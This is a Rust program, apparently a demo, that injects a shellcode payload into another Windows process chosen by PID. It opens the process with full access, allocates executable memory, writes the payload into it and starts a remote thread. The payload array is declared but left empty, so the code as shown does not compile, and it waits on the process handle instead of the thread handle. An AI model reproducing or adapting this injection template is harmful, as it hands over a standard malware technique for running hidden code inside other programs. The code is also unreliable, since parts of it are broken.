use std::{env, ffi::c_void};
use windows::Win32::{Foundation::CloseHandle, System::{Diagnostics::Debug::WriteProcessMemory, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS}}};
use core::u32::MAX;

// Some debugging macros
macro_rules! okay {
    ($($arg:tt)*) => {
        println!("[+] {}", format_args!($($arg)*));
    };
}
macro_rules! warn {
    ($($arg:tt)*) => {
        println!("[!] {}", format_args!($($arg)*));
    };
}
macro_rules! info {
    ($($arg:tt)*) => {
        println!("[-] {}", format_args!($($arg)*));
    };
}

fn main() {
    // Checking for correct usage
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 || args[1].parse::<u32>().is_err() {
        warn!("Usage: {} <PID>", args[0]);
        return;
    }
    let pid: u32 = args[1].parse().unwrap();

    info!("Starting process injection demo on process {}...", pid);
    unsafe {
        info!("Getting handle on process {}", pid);
        let res_h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if res_h_process.is_err() {
            warn!("Failed to get handle on process {}, error: {:?}", pid, res_h_process);
            return;
        }
        let h_process = res_h_process.unwrap();

        info!("Allocating memoy in process");
        let payload: [u8; 460] = [
            ];
            
        let addr = VirtualAllocEx(h_process, None, payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        info!("Wiriting payload to process memory");
        let res_write = WriteProcessMemory(h_process, addr, payload.as_ptr() as *const c_void, payload.len(), None);
        if res_write.is_err() {
            warn!("Failed to write payload to process memory, error: {:?}", res_write);
            return;
        }

        info!("Creating remote thread to execute payload");
        let tid: Option<*mut u32> = Default::default();
        let res_creathread = CreateRemoteThreadEx(h_process, None, 0, Some(std::mem::transmute(addr)), None, 0, None, tid);
        if res_creathread.is_err() {
            warn!("Could not create thread, error {:?}", res_creathread);
            return;
        }
        // ! okay!("Succesfully created thread with TID {}", *(tid.unwrap()));
        // Does not seem to work yet. Tries to unwrap a None value...

        info!("Waiting for thread to finish execution");
        WaitForSingleObject(h_process, MAX);
        okay!("Thread finished excecution");
        info!("Closing handle");
        let res = CloseHandle(h_process).is_err();
        if res {
            warn!("Could not close handle, error: {:?}", res);
            return;
        }
        info!("Goodbye");
    }
    return;
}